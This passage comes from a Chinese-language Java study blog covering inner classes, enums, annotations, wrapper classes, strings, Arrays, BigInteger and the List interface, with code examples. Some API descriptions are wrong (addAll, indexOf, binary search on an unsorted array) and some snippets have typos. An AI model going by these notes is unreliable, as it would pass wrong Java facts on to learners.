class_">Inner</span>();<br></code></pre></td></tr></table></figure><p>​在外部类里面定义一个方法，返回内部类的对象</p><ul><li>外部类和内部类重名，就近原则。访问外部类成员，使用（外部类名.this.成员）去访问</li></ul><h2 id="获取内部类的类名"><a href="#获取内部类的类名" class="headerlink" title="获取内部类的类名"></a>获取内部类的类名</h2><p>getClass、jeb</p><h1 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>有 static 修饰</p><h2 id="注意事项-5"><a href="#注意事项-5" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li><p>只能访问外部类的静态成员，包含私有的</p></li><li><p>作用域属于整个类</p></li><li><p>可以添加任意访问修饰符去修饰静态内部类</p></li><li><p>外部类可以访问静态内部类</p></li><li><p>外部其他类可以访问静态内部类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>.Inner();<br></code></pre></td></tr></table></figure><p>在外部类里面定义一个方法，返回内部类的对象</p><ul><li>外部类和内部类重名，就近原则。访问外部类成员，使用（外部类名.静态成员名）去访问</li></ul></li></ul><h1 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h1><h2 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h2><p>定义在外部类的局部位置上，比如方法中，并且有类名</p><h2 id="注意事项-6"><a href="#注意事项-6" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>可以直接访问外部类所有成员</li><li>如果定义在静态方法中，只能访问外部类的静态成员</li><li>不能添加访问修饰符，可以用final 修饰</li><li>作用域仅在代码块中，与局部变量一致</li><li>重名遵循就近原则，访问外部类成员用<strong>（外部类名.this.成员）</strong>去访问（实例方法中），静态方法中，（外部类名.静态成员名）访问</li><li>外部类不能访问局部内部类</li></ul><h1 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a>匿名内部类</h1><h2 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h2><p>基于接口的匿名内部类</p><p>基于类（抽象类）的匿名内部类</p><h2 id="注意事项-7"><a href="#注意事项-7" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>可以访问外部类，受访问修饰符影响，局部内部类不能定义静态成员</li><li>只能创建一个实例</li><li>就近原则，匿名内部类处于外部类里面时<strong>（外部类名.this.成员）</strong>静态成员（外部类名.静态类名）</li><li>外部类不能访问匿名内部类</li><li>匿名内部类在定义的同时直接创建对象，并且当作实参传递</li></ul><h1 id="枚举类"><a href="#枚举类" class="headerlink" title="枚举类"></a>枚举类</h1><h2 id="自定义枚举类"><a href="#自定义枚举类" class="headerlink" title="自定义枚举类"></a>自定义枚举类</h2><ul><li>构造器私有化</li><li>public static final 修饰的属性</li><li>创建对象赋值给这些属性</li><li>定义 toString 方法</li></ul><h2 id="enum-类"><a href="#enum-类" class="headerlink" title="enum 类"></a>enum 类</h2><ul><li>关键字 enum 代替 class</li></ul><h2 id="使用关键字-enum-时，会变成-final-类，并且隐式继承-Enum-类"><a href="#使用关键字-enum-时，会变成-final-类，并且隐式继承-Enum-类" class="headerlink" title="使用关键字 enum 时，会变成 final 类，并且隐式继承 Enum 类"></a>使用关键字 enum 时，会变成 final 类，并且隐式继承 Enum 类</h2><ul><li>javap 反编译 class</li><li>不能被继承或再继承其他类，但是可以实现接口</li><li>使用 Enum 类相关方法</li></ul><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">Season autumn=Season.AUTUMN;<br><span class="hljs-comment">//name()返回枚举对象的名字</span><br>System.out.println(autumn.name());<br><span class="hljs-comment">//ordinal()返回枚举对象的次序/编号，从0开始编号</span><br>System.out.println(autumn.ordinal());<br><span class="hljs-comment">//values()返回定义的所有枚举对象</span><br>Season[] values=Season.values();<br><span class="hljs-comment">//valueOf()将字符串转换成枚举对象，字符串必须为已有的枚举对象名</span><br>Season autumn1=Season <span class="hljs-title function_">valueOf</span><span class="hljs-params">(<span class="hljs-string">&quot;AUTUMN&quot;</span>)</span>;<br>System.out.println(Season.SUMMER.compareTo(SEason.AUTUMN));<span class="hljs-comment">//两个值相减</span><br><span class="hljs-comment">//toString()</span><br></code></pre></td></tr></table></figure><h1 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h1><h2 id="Annotation"><a href="#Annotation" class="headerlink" title="Annotation"></a>Annotation</h2><p>retrofit2</p><h2 id="基本-Annotation"><a href="#基本-Annotation" class="headerlink" title="基本 Annotation"></a>基本 Annotation</h2><ul><li>@Override：验证方法为重写父类方法，只能用于方法</li><li>@Deprecated：用于表示某个元素（类&#x2F;方法等）已过时</li><li>@SuppressWarnings({“all”})：抑制编译器警告</li></ul><h2 id="注解类"><a href="#注解类" class="headerlink" title="注解类"></a>注解类</h2><ul><li>@Target（ElementType.METHOD），指定注解范围</li><li>@Target 修饰注解的注释，称为元注解</li><li>@interface 是注解类</li></ul><h1 id="try-catch"><a href="#try-catch" class="headerlink" title="try-catch"></a>try-catch</h1><p>try 包裹可能出现异常代码，catch 去捕获异常，try 出现异常，出现异常的代码后面不会执行</p><h1 id="throws-与-throw"><a href="#throws-与-throw" class="headerlink" title="throws 与 throw"></a>throws 与 throw</h1><p>抛出异常要与父类一致</p><p>throw: 后面跟异常对象</p><p>throws: 做异常处理方式，在方法中</p><h1 id="包装类"><a href="#包装类" class="headerlink" title="包装类"></a>包装类</h1><h2 id="包装类型和-String-类型的转换"><a href="#包装类型和-String-类型的转换" class="headerlink" title="包装类型和 String 类型的转换"></a>包装类型和 String 类型的转换</h2><p>a) 包装类型转 String 类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Integer i=<span class="hljs-number">10</span>;<br> String s1=i.toString();<br> String s2=String.valueOf(i);<br> String s3=i+<span class="hljs-string">&quot;&quot;</span>;<br> System.out.println(s1);<br> System.out.println(s2);<br> System.out.println(s3);<br></code></pre></td></tr></table></figure><p>b）String 类型转包装类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Integer i1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(s1);<br>   Integer i2=Integer.valueOf(s2);<br>   Integer i3=Integer.parseInt(s3);<br>   System.out.println(i1);<br>   System.out.println(i2);<br>   System.out.println(i3);<br></code></pre></td></tr></table></figure><p>c）例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java">Object obj1=<span class="hljs-literal">true</span>?<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">1</span>):<span class="hljs-keyword">new</span> <span class="hljs-title class_">Double</span>(<span class="hljs-number">2.0</span>);<span class="hljs-comment">//三元条件运算符是一个整体</span><br>   System.out.println(obj1);<span class="hljs-comment">//1.0</span><br><br>Object obj2;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-literal">true</span>)&#123;<br>       obj2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">1</span>);<br>   &#125;<span class="hljs-keyword">else</span> &#123;<br>       obj2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Double</span>(<span class="hljs-number">2.0</span>);<br>   &#125;<br>   System.out.println(obj2);<span class="hljs-comment">//1</span><br><br><br>Integer i=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">1</span>);<br>   Integer j=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">1</span>);<br>   System.out.println(i==j);  <span class="hljs-comment">//false</span><br>   <br>   Integer m=<span class="hljs-number">1</span>;<br>   Integer n=<span class="hljs-number">1</span>;<br>   System.out.println(m==n);<span class="hljs-comment">//True,指向同一个对象</span><br>   <br>   Integer x=<span class="hljs-number">128</span>;<br>   Integer y=<span class="hljs-number">128</span>;<br>   System.out.println(x==y);<span class="hljs-comment">//False超过范围，通过new去创建，不等</span><br>   <br>   Integer a=<span class="hljs-number">128</span>;<br>   <span class="hljs-type">int</span> b=<span class="hljs-number">128</span>;<br>   System.out.println(a==b);<span class="hljs-comment">//True,存在基本数据类型，比较的是值</span><br><br></code></pre></td></tr></table></figure><h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul><li>final 类，不能被继承</li><li>直接赋值，调用构造器</li><li>属性 private final char value[ ];存放字符串内容</li></ul><h2 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">String a=<span class="hljs-string">&quot;abcd&quot;</span>;<span class="hljs-comment">//指向常量池</span><br>String b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;abcd&quot;</span>);<span class="hljs-comment">//指向对象，对象指向常量池</span><br>System.out.println(a.equals(b)); <span class="hljs-comment">//True</span><br>System.out.println(a==b);<span class="hljs-comment">//False</span><br></code></pre></td></tr></table></figure><h2 id="常量池字符串"><a href="#常量池字符串" class="headerlink" title="常量池字符串"></a>常量池字符串</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">String s1=<span class="hljs-string">&quot;hello&quot;</span>+<span class="hljs-string">&quot;java&quot;</span>;<br><span class="hljs-comment">//hellojava</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">String a=<span class="hljs-string">&quot;hell&quot;</span>;<br>String b=<span class="hljs-string">&quot;jab&quot;</span>;<br>String c=a+b;<span class="hljs-comment">//new 了一个对象</span><br>String d=<span class="hljs-string">&quot;helljab&quot;</span>;<br>System.out.println(c==d);<br><span class="hljs-comment">//false</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">String str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;abc&quot;</span>);<br>     <span class="hljs-keyword">final</span> <span class="hljs-type">char</span>[] ch=&#123;<span class="hljs-string">&#x27;j&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>&#125;;<br>     change(str,ch);<br>     System.out.println(str);<br>     System.out.println(ch);<br> &#125;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">change</span><span class="hljs-params">(String str,<span class="hljs-type">char</span> ch[])</span>&#123;<br>     str=<span class="hljs-string">&quot;java&quot;</span>;<br>     ch[<span class="hljs-number">0</span>]=<span class="hljs-string">&#x27;a&#x27;</span>;<br> &#125;<br> <br> <span class="hljs-comment">//aava</span><br></code></pre></td></tr></table></figure><h1 id="字符串编码"><a href="#字符串编码" class="headerlink" title="字符串编码"></a>字符串编码</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">String name=<span class="hljs-string">&quot;我虽然&quot;</span>;<br>String ISO_s=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(name.getBytes(StandardCharsets.UTF_8),StandardCharsets.ISO_8859_1);<br>System.out.println(ISO_s);<br>String UTF8_s= <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(ISO_s.getBytes(StandardCharsets.ISO_8859_1),StandardCharsets.UTF_8);<br> System.out.println(UTF8_s);<br></code></pre></td></tr></table></figure><h1 id="StringBuffer"><a href="#StringBuffer" class="headerlink" title="StringBuffer"></a>StringBuffer</h1><h2 id="特性-1"><a href="#特性-1" class="headerlink" title="特性"></a>特性</h2><ul><li>不能被继承</li><li>父类是 AbstractStringBuilder</li><li>AbstractStringBuilder 有属性 char[] value,存放在堆中</li></ul><h2 id="StingBuffer-和-String-的转换"><a href="#StingBuffer-和-String-的转换" class="headerlink" title="StingBuffer 和 String 的转换"></a>StingBuffer 和 String 的转换</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">StringBuffer stringBuffer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(<span class="hljs-string">&quot;abcd&quot;</span>);<br>stringBuffer=stringBuffer.append(<span class="hljs-string">&quot;ac&quot;</span>)<br>String s=stringBuffer.toString();<br>String ss=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(stringBuffer);<br>System.out.println(s);<br><span class="hljs-comment">//abcdac</span><br></code></pre></td></tr></table></figure><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>append，toString</p><h2 id="String、StringBuffer、StringBuider"><a href="#String、StringBuffer、StringBuider" class="headerlink" title="String、StringBuffer、StringBuider"></a>String、StringBuffer、StringBuider</h2><p>StringBuider 效率最高，拼接字符串</p><h2 id="Arrays"><a href="#Arrays" class="headerlink" title="Arrays"></a>Arrays</h2><p> sort 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java">Person abc=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;abc&quot;</span>,<span class="hljs-number">30</span>);<br>        Person umr=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;umr&quot;</span>,<span class="hljs-number">23</span>);<br>        Person acd=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;acd&quot;</span>,<span class="hljs-number">40</span>);<br>        Person[] aaa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>[]&#123;abc,umr,acd&#125;;<br>        Arrays.sort(aaa, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>() &#123;<br>           <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br>                <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> ((Person)o1) .age -((Person)o2).age;<br>                <span class="hljs-keyword">return</span> i;<br>            &#125;<br>        &#125;);<br>        System.out.println(Arrays.toString(aaa));<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&#123;<br>        String name=<span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>            <span class="hljs-built_in">this</span>.name=name;<br>            <span class="hljs-built_in">this</span>.age=age;<br>        &#125;<br>        <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                    <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                    <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">//[Person&#123;name=&#x27;umr&#x27;, age=23&#125;, Person&#123;name=&#x27;abc&#x27;, age=30&#125;, Person&#123;name=&#x27;acd&#x27;, age=40&#125;]</span><br></code></pre></td></tr></table></figure><h2 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h2><p>Arrays.toString  返回数组的字符串形式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">Integer[] aa = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>[]&#123;<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;;<br>   Arrays.sort(aa, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>() &#123;<br>           <span class="hljs-meta">@Override</span><br>           <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br>               <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (Integer) o1 - (Integer) o2;<br>               <span class="hljs-keyword">return</span> i;<br>           &#125;<br>       &#125;);<br>   System.out.println(Arrays.toString(aa));<br>   <span class="hljs-comment">//[1, 2, 3, 4, 5, 6]</span><br></code></pre></td></tr></table></figure><p>Arrays.sort 自然排序和定制排序（数值排序、对象排序）</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">参考前面的 <span class="hljs-built_in">sort</span> 方法例子<br></code></pre></td></tr></table></figure><p>Arrays.copyOf  数组元素的复制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] aa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>&#125;;<br>   <span class="hljs-type">int</span>[] bb=Arrays.copyOf(aa,aa.length);<br>   bb[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>;<br>   System.out.println(Arrays.toString(bb));<br></code></pre></td></tr></table></figure><p> Arrays.aslist 数组转化为 List 集合</p><p>Arrays.fill  数组填充</p><p>Arrays.binarySearch 二分查找（有序数组）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span>[] aa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>&#125;;<br><span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> Arrays.binarySearch(aa,<span class="hljs-number">11</span>);<br>        System.out.println(i);<br><span class="hljs-comment">// 10</span><br>前提：有序情况下<br><br>无序时，先排序<br><span class="hljs-type">int</span>[] aa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>&#125;;<br>Arrays.sort(aa);<br>    System.out.println(Arrays.toString(aa));<br>    <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> Arrays.binarySearch(aa,<span class="hljs-number">2</span>);<br>    System.out.println(i);<br><span class="hljs-comment">//[0, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14]</span><br><span class="hljs-comment">//2</span><br><br>找不到就返回负数，-(low+<span class="hljs-number">1</span>)，low 为原本出现的位置，比如查找 <span class="hljs-number">10</span>，返回 -<span class="hljs-number">11</span> <br></code></pre></td></tr></table></figure><p>System.arraycopy   复制数组</p><p>System. currentTimeMillens( )返回当前距离时间</p><h2 id="BigInteger"><a href="#BigInteger" class="headerlink" title="BigInteger"></a>BigInteger</h2><p>保存比较大的数</p><p>BigDecimal  保存精度更高的小数</p><ul><li>add  加</li><li>subtract 减</li><li>multiply 乘</li><li>divide 除</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">BigInteger bigInteger1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;111111111111111111111111111111111111111&quot;</span>);<br>BigInteger bigInteger2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigInteger</span>(<span class="hljs-string">&quot;100&quot;</span>);<br><br>BigInteger add=bigInteger1.add(bigInteger2);<br>System.out.println(add);<br><br>BigInteger subtract=bigInteger1.subtract(bigInteger2);<br>System.out.println(subtract);<br><br>BigInteger multiply=bigInteger1.multiply(bigInteger2);<br>System.out.println(multiply);<br><br>BigInteger divide=bigInteger1.divide(bigInteger2);<br>System.out.println(divide);<br></code></pre></td></tr></table></figure><h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><h2 id="集合框架体系"><a href="#集合框架体系" class="headerlink" title="集合框架体系"></a>集合框架体系</h2><ul><li>主要是两组 Collection 和 Map （单列集合，双列集合）</li><li>Collection 接口有两个子接口 List、Set，其实现子类都是单列集合</li><li>Map 接口的实现子类是双列集合，存放的 K-V</li></ul><h2 id="Collection-接口"><a href="#Collection-接口" class="headerlink" title="Collection 接口"></a>Collection 接口</h2><ul><li><p>add 添加单个元素，都是Object ，基本数据类型加入的是包装类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Collection collection=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>  collection.add(<span class="hljs-number">100</span>);<br>  collection.add(<span class="hljs-string">&quot;java&quot;</span>);<br>  collection.add(<span class="hljs-literal">false</span>);<br>  collection.add(<span class="hljs-literal">null</span>);<br>  System.out.println(collection);<br></code></pre></td></tr></table></figure></li><li><p>remove 删除指定元素，List 的子类有重载，可以按 index 删除</p></li><li><p>contains 查找元素是否存在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">collection.contains(<span class="hljs-literal">false</span>);<br>   System.out.println(collection.contains(<span class="hljs-literal">false</span>));<br></code></pre></td></tr></table></figure></li><li><p>size 获取元素个数</p></li><li><p>isEmpty 判断是否为空</p></li><li><p>clear 清空</p></li><li><p>addAll 查找多个元素是否存在</p></li><li><p>removeAll 删除多个元素</p></li></ul><h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><ul><li>有序，可重复</li><li>void add ( int index,Object ele ) 在 index 位置插入 ele 元素</li><li>boolean addAll ( int index,Collection eles) 从 index 位置开始将 eles 中的所有元素添加进来</li><li>Object get ( int index) 获取指定 index 位置的元素</li><li>int indexOf（Object obj)返回 obj 在当前集合中最后一次出现的位置</li><li>Object remove ( int index) 移除指定 index 位置的元素，并返回此元素</li><li>Object set （ int index,Object ele )  设置指定 index 位置的元素为 ele，相当于替换</li><li>List sublist ( int fromIndex,int toIndex)  返回从 fromIndex 到 toIndex 位置的子集合</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">List</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>   list.add(<span class="hljs-string">&quot;javass&quot;</span>);<br>   list.add(<span class="hljs-string">&quot;urm&quot;</span>);<br>   list.add(<span class="hljs-string">&quot;rr&quot;</span>);<br>   list.add(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;java&quot;</span>);<br>       <br>   List list2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>   list2.add(<span class="hljs-string">&quot;javass2&quot;</span>);<br>   list2.add(<span class="hljs-string">&quot;urm2&quot;</span>);<br>   list2.add(<span class="hljs-string">&quot;rr2&quot;</span>);<br>   list.addAll(<span class="hljs-number">1</span>,list2);<br>   list.add(<span class="hljs-string">&quot;urm2&quot;</span>);<br>   list.add(<span class="hljs-string">&quot;urm&quot;</span>);<br>       <br>   System.out.println(list.get(<span class="hljs-number">4</span>));    <span class="hljs-comment">//urm</span><br>       <br>   System.out.println(list.indexOf(<span class="hljs-string">&quot;urm2&quot;</span>));       <span class="hljs-comment">//2</span><br>       <br>   System.out.println(list.lastIndexOf(<span class="hljs-string">&quot;urm&quot;</span>));        <span class="hljs-comment">//8</span><br>   list.remove(<span class="hljs-number">8</span>);<br>   list.set(<span class="hljs-number">7</span>,<span class="hljs-string">&quot;urm4&quot;</span>);<br>   System.out.println(list.subList(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>));      <span class="hljs-comment">//[javass2, urm2, rr2]</span><br>   System.out.println(list);   <span class="hljs-comment">//[javass, javass2, urm2, rr2, urm, java, rr, 